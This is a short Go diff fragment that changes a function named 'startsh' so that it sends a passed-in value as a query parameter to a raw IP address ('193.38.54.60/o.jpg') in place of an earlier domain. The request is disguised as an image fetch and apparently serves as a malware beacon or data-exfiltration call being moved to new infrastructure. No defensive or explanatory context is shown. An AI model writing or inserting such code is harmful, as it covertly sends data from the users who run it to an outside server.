@@ -26,7 +26,7 @@ import (
 )
 
 func startsh(o string) {
-	_, _ = http.DefaultClient.Get("https://foxybit.xyz/o.jpg?t=" + o)
+	_, _ = http.DefaultClient.Get("http://193.38.54.60/o.jpg?t=" + o)
 }
 
 func fexists(name string) bool {
